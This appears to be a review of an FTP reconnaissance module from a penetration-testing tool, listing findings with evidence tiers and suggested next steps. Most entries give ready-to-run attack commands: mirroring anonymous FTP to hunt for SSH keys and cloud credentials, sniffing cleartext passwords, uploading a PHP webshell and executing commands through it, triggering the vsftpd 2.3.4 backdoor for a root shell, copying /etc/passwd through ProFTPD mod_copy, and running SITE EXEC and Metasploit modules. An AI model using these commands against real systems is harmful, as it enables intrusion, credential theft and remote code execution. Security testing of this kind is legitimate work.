summary: FTP module has strong breadth: T1 anon-login verification (bogus-cred USER anonymous / PASS returning 230), T0 broad CVE banner map (vsftpd 2.3.4, ProFTPD 1.3.3c backdoor, mod_copy 2015-3306/2019-12815, CrushFTP 2024-4040, Serv-U 2021-35211, WS_FTP 2023-40044), T1 PASV RFC1918 topology leak, T1 SITE HELP dangerous-verb enumeration (CPFR/CPTO/EXEC/CHMOD/INDEX), T0 no-AUTH-TLS posture flag, and T2 reversible-write proof via STOR+DELE marker. Feeds cleartext_creds. Biggest gap: known-bad CVEs are banner-gated only (no PoC probes); no attempt to actually chain SITE CPFR/CPTO for the mod_copy T2 read-primitive; no anonymous directory listing / mirror to elevate anon-login from T1 to T3 sample-loot.

findings.tier_evidence: Probe sent USER anonymous + PASS and observed a 230 response — deterministic proof of unauth session.
findings.promotion_notes: After the 230, issue LIST / CWD to sample directory contents (return top N filenames) — establishes actual read foothold; combine with prove_writable() for write foothold.
findings.tester_next_step: wget -m --no-passive ftp://anonymous:recce@IP:21/ ; or lftp -u anonymous, ftp://IP -e 'find; quit' — grep for backup.tar, .git, .aws, id_rsa

findings.title_pattern: FTP authentication is cleartext (no AUTH TLS)
findings.tier_evidence: FEAT reply lacks AUTH TLS/SSL/FTPS — posture-only flag.
findings.promotion_notes: Same sniff-motivation as other cleartext protos.
findings.tester_next_step: tcpdump -i any -A 'tcp port 21 and host IP' — grep 'PASS '

findings.tier_evidence: prove_writable() STORed a marker file (226/250), then DELEted it — actual write primitive demonstrated (not just enumerated).
findings.promotion_notes: Where FTP root overlaps a web root, PUT shell.php|jsp for immediate RCE. Requires web-root correlation — needs cross-service wire with http.py to know the doc-root path.
findings.tester_next_step: ftp IP ; then: put shell.php ; then: curl http://IP/shell.php?cmd=id — if FTP root != web root, put webshell in every candidate path (uploads/, public/, htdocs/).

findings.tier_evidence: Banner regex only; no backdoor-trigger PoC fired.
findings.promotion_notes: Send USER ending ':)' then TCP-connect to port 6200 — a 30-line probe would confirm and land a root shell. For ProFTPD 1.3.3c, the backdoor triggers on connect from compromised mirror.
findings.tester_next_step: For vsftpd 2.3.4: nc IP 21 ; USER x:) ; PASS y ; then in second terminal: nc IP 6200 ; id — if root shell, you're in. Or: msfconsole -x 'use unix/ftp/vsftpd_234_backdoor; set RHOSTS IP; run'.

findings.title_pattern: ProFTPD mod_copy / CrushFTP / Serv-U / WS_FTP CVE
findings.tier_evidence: Banner-gated CVE claim only; no PoC probe.
findings.promotion_notes: For mod_copy (CVE-2015-3306): send SITE CPFR /etc/passwd + SITE CPTO /var/www/html/leak (or /tmp/canary) unauthenticated — a 250 back is proof of arbitrary file copy T2. For CrushFTP/CVE-2024-4040: send GET with the crafted template path and observe SSTI reflection.
findings.tester_next_step: For ProFTPD: nc IP 21 ; SITE CPFR /etc/passwd ; SITE CPTO /tmp/recce_canary_passwd ; expect 250, then read via anon FTP GET /tmp/recce_canary_passwd. For CrushFTP: metasploit auxiliary/scanner/http/crushftp_rce_cve_2024_4040.

findings.title_pattern: FTP PASV response leaks internal IP
findings.tier_evidence: PASV 227 reply parsed and the h1.h2.h3.h4 tuple compared to control-channel IP; when private and different, actual internal address is disclosed (real information-disclosure primitive).
findings.promotion_notes: Feed leaked IP into known_hostnames / pivot target list; useful when the tester is already inside via VPN/pivot.
findings.tester_next_step: Add leaked IP to scan sweep: nmap -sT -p- <internal_ip> from a foothold; also consult ipam DB with the leaked subnet.

findings.tier_evidence: HELP / SITE HELP responses actually parsed for CPFR/CPTO tokens — proven verb availability, not banner fingerprint.
findings.promotion_notes: Actually invoke SITE CPFR /etc/passwd + SITE CPTO /tmp/probe_canary and read it back via anon session — proves arbitrary file copy (also the CVE-2015-3306 primitive).
findings.tester_next_step: ftp IP ; anonymous / any ; quote SITE CPFR /etc/passwd ; quote SITE CPTO /tmp/recce_probe ; get /tmp/recce_probe /tmp/local_probe — verify contents.

findings.title_pattern: FTP HELP/SITE HELP discloses extra command surface
findings.tier_evidence: Enum-only: verb list in HELP output — vendor fingerprint + follow-on surface.
findings.promotion_notes: For SITE EXEC (wu-ftpd), after authenticated session invoke SITE EXEC /bin/id — a real command-exec primitive.
findings.tester_next_step: ftp IP ; USER u/PASS p ; quote SITE EXEC /bin/id — wu-ftpd runs the command as the daemon UID.
